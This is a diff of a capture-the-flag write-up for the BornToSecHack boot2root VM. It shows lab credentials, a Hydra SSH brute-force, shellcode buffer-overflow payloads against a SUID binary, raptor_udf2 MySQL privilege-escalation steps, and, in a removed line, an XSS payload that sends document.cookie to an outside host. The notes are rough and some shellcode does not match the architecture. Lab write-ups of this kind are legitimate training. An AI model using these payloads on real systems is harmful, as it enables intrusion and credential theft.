@@ -256,8 +256,7 @@ If I explore the "Users" tab:
 
 With the credentials:
 ```
-laurie@borntosec.net
-!q\]Ej?*5K5cy*AJ
+laurie@borntosec.net:!q\]Ej?*5K5cy*AJ
 ```
 we have access to the mail box:
 ![[Pasted image 20240422154048.png]]
@@ -267,8 +266,7 @@ Two mails awaited us, among which:
 
 The credentials:
 ```
-root
-Fg-'kKXBj87E:aJ$
+root:Fg-'kKXBj87E:aJ$
 ```
 allow us to accede to the phpMyAdmin page:
 ![[Pasted image 20240422154638.png]]
@@ -294,7 +292,7 @@ However, I can't identify the kind of hashing..
 
 Usually MySQL5 Hash follows this pattern:
 ![[Pasted image 20240422164245.png]]
-However, it doesn't seem to be the case now.
+But it doesn't seem to be the case now.
 
 By following this [guide](https://medium.com/@959652664/summary-and-analysis-of-penetration-testing-based-on-phpmyadmin-784896851cf9), to make MySQL execute commands like the following one:
 ```
@@ -861,8 +859,16 @@ void phase_5(char *param_1)
   }
   return;
 }
-
 ```
+
+
+
+
+
+
+
+
+
 
 To resume:
 ```
@@ -870,6 +876,262 @@ Public speaking is very easy.
 1 2 6 24 120 720
 0 q 777
 9
+opuKMA
+4 2 6 3 1 5
+```
+
+We now have a list of the possible results, and we will use [Hydra](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial) to bruteforce the SSH service with this wordlist:
+
+```
+┌──(fab㉿kali)-[~]
+└─$ hydra -l thor -p wordlist.txt 192.168.56.101 ssh
+<SNIP>
+
+```
+
+
+Our credentials are:
+```
+thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
+```
+and we can connect via SSH as user thor:
+```
+┌──(fab㉿kali)-[~]
+└─$ ssh thor@192.168.56.101
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+thor@192.168.56.101's password:
+thor@BornToSecHackMe:~$ ls -la
+total 37
+drwxr-x--- 3 thor     thor   129 Oct 15  2015 .
+drwxrwx--x 9 www-data root   126 Oct 13  2015 ..
+-rwxr-x--- 1 thor     thor     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc
+drwx------ 2 thor     thor    43 Oct 15  2015 .cache
+-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile
+-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
+-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+thor@BornToSecHackMe:~$
+```
+### The Turtle
+
+`turtle` is an ASCII text file containing a series of instructions that lead to the word "SLASH":
+![[pythonsandbox-canvas.png]]
+```
+┌──(fab㉿kali)-[~]
+└─$ file turtle
+turtle: ASCII text
+
+┌──(fab㉿kali)-[~]
+└─$ cat turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+<SNIP>
+
+Can you digest the message? :)
+thor@BornToSecHackMe:~$
+```
+
+I was like "digest"? What does ["message digest"](https://www.techopedia.com/definition/4024/message-digest) mean?
+"A message digest is a cryptographic hash function containing a string of digits created by a one-way hashing formula."
+
+After having tried to hash the word "SLASH" with `sha1sum` and `sha256sum`, we tried `md5sum` and got it:
+```
+┌──(fab㉿kali)-[~]
+└─$ echo -n SLASH > slash.txt
+
+┌──(fab㉿kali)-[~]
+└─$ md5sum slash.txt
+646da671ca01bb5d84dbb5fb2238dc8e  slash.txt
+
+┌──(fab㉿kali)-[~]
+└─$
+```
+
+So we have:
+```
+zaz:646da671ca01bb5d84dbb5fb2238dc8e
+```
+and we can `su zaz`:
+```
+thor@BornToSecHackMe:~$ su zaz
+Password:
+zaz@BornToSecHackMe:~$
+```
+
+### A Buffer Overflow
+
+The executable file we find has an SUID and an SGID:
+```
+zaz@BornToSecHackMe:~$ ls -la
+total 12
+drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
+drwxrwx--x 1 www-data root   60 Oct 13  2015 ..
+-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
+drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
+-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
+-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
+zaz@BornToSecHackMe:~$ file exploit_me
+exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
+zaz@BornToSecHackMe:~$
+```
+
+```
+┌──(fab㉿kali)-[~]
+└─$ scp zaz@192.168.56.101:/home/zaz/exploit_me ./
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+zaz@192.168.56.101's password:
+exploit_me                                                                            100% 4880     1.2MB/s   00:00
+
+┌──(fab㉿kali)-[~]
+└─$ ghidra
+```
+
+We probably have to make a buffer overflow, since there's a `puts()` function waiting for an input and a totally useless `main()` function:
+```
+bool main(int param_1,int param_2)
+{
+  char local_90 [140];
+  
+  if (1 < param_1) {
+    strcpy(local_90,*(char **)(param_2 + 4));
+    puts(local_90);
+  }
+  return param_1 < 2;
+}
+```
+
+Since Libc is used, we can maybe make the program execute a function like `execve()` through a [buffer overflow](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow).
+
+1040 – 46 – 4 = 990 bytes left for our NOP slide.
+I have to inject 140 + 12 + 4 = 156
+for me 156 - 50 = 106 of NOP
+https://reverseengineering.stackexchange.com/questions/27826/using-a-buffer-overflow-to-call-a-function
+
+![[Pasted image 20240424184520.png]]
+
+```
+./exploit_me $(python -c "print '\x90'*37+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*100 +'\xb0\xf6\xff\xbf'")
+```
+
+```
+readelf
+```
+
+http://shell-storm.org/shellcode/files/shellcode-827.html
+
+```
+./exploit_me `perl -e 'print "A"x102 . "\x60\xf3\xff\xbf" . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"'`
+```
+
+[shellcode](https://www.arsouyes.org/blog/2019/54_Shellcode/index.en.html)
+```
+./exploit_me `perl -e 'print "\x90"x990 . "\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05" . "\xe0\xf6\xff\xbf"'`
+```
+
+We use [PEDA](https://github.com/longld/peda), for Python Exploit Development Assistance for GDB.
+
+We launch our executable and we test it with a long line of 'A':
+```
+┌──(fab㉿kali)-[~/rainfall/b2r]
+└─$ gdb exploit_me
+```
+![[Pasted image 20240425135544.png]]
+![[Pasted image 20240425135608.png]]
+We see that the EBP register contains the hexadecimal string 0x41414141, or four times the letter 'A', as we can see from the ASCII table:
+![[Pasted image 20240425135520.png]]
+
+We would like to enter malicious code into the EIP register.
+
+
+
+
+
+
+ça a fait un truc:
+```
+`perl -e 'print "A"x102 . "\x60\xf3\xff\xbf" . "\x90"x10 . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"'`
+```
+
+![[Pasted image 20240425140954.png]]
+
+We try to make the program crash with a random string of 200 characters:
+```
+┌──(fab㉿kali)-[~]
+└─$ msf-pattern_create -l 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+┌──(fab㉿kali)-[~]
+└─$
+```
+
+![[Pasted image 20240425141610.png]]
+
+We calculate the offset towards EIP:
+```
+┌──(fab㉿kali)-[~]
+└─$ msf-pattern_offset -q 6Ae7
+[*] Exact match at offset 140
+
+┌──(fab㉿kali)-[~]
+└─$
+```
+We need to pad our input with 140 characters before adding our shellcode that will be written on the memory.
+
+However, we need to find the address of the ESP where a pointer to the previous instruction is stored:
+
+```
+gdb-peda$ run `perl -e 'print "A"x140'`
+<SNIP>
+
+gdb-peda$ info frame
+Stack level 0, frame at 0xffffcecc:
+ eip = 0xf7da3701; saved eip = 0xffffcf80
+ called by frame at 0x41414149
+ Arglist at 0x41414141, args:
+ Locals at 0x41414141, Previous frame's sp is 0xffffcecc
+ Saved registers:
+  ebx at 0xffffcec0, esi at 0xffffcec4, eip at 0xffffcec8
+gdb-peda$ print $esp
+$1 = (void *) 0xffffcec0
+gdb-peda$ q
+
+┌──(fab㉿kali)-[~/rainfall/b2r]
+└─$ ./exploit_me `perl -e 'print "A"x140 . "\xc0\xce\xff\xff" . "\x90"x30 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+```
+
+
+[shellcode](http://shell-storm.org/shellcode/files/shellcode-904.html)
+```
+./exploit_me `perl -e 'print "A"x140 . "\xc0\xce\xff\xff" . "\x90"x30 . "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'`
 ```
 
 
@@ -877,33 +1139,25 @@ Public speaking is very easy.
 
 
 
-### [`raptor_udf2.so`](https://www.exploit-db.com/exploits/1518)
 
+
+
+
+
+
+
+In a folder named `mail/.imap/` we find some [Dovecot logs](https://doc.dovecot.org/admin_manual/logging), with detailed error messages:
 ```
-$ gcc -g -c raptor_udf2.c
-$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+zaz@BornToSecHackMe:~/mail/.imap$ ls -la
+total 1
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .
+drwxr-x--- 3 zaz zaz 107 Oct  8  2015 ..
+-rwxr-x--- 1 zaz zaz  72 Oct  8  2015 dovecot.mailbox.log
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Drafts
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Sent
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Trash
+zaz@BornToSecHackMe:~/mail/.imap$
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-options
-https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
-
 
 
 
@@ -920,6 +1174,43 @@ Escape character is '^]'.
 
 ```
 
+
+
+
+
+
+
+
+
+
+
+
+
+### [`raptor_udf2.so`](https://www.exploit-db.com/exploits/1518)
+
 ```
-<img src="http://192.168.119.135" onerror=fetch('http://192.168.119.135/'+document.cookie);>
+┌──(fab㉿kali)-[~]
+└─$ gcc -g -c raptor_udf2.c
+
+┌──(fab㉿kali)-[~]
+└─$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+┌──(fab㉿kali)-[~]
+└─$ scp raptor_udf2.so thor@192.168.56.101:~/
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+thor@192.168.56.101's password:
+raptor_udf2.so                                                                        100%   17KB   3.5MB/s   00:00
+
+┌──(fab㉿kali)-[~]
+└─$
 ```
+
+options
+https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
